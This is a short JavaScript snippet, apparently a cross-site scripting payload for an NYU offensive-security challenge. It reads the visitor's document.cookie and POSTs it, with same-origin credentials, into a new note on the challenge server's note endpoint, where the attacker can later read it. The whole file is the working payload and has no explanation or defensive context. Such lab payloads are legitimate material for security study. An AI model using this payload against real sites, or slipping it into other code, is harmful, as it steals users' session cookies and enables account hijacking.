var formData = new FormData();
formData.append('title', 'test');
formData.append('content', document.cookie);
formData.append('submit', 'save');

fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
    method: "POST",
    credentials: "same-origin",
    body: formData
});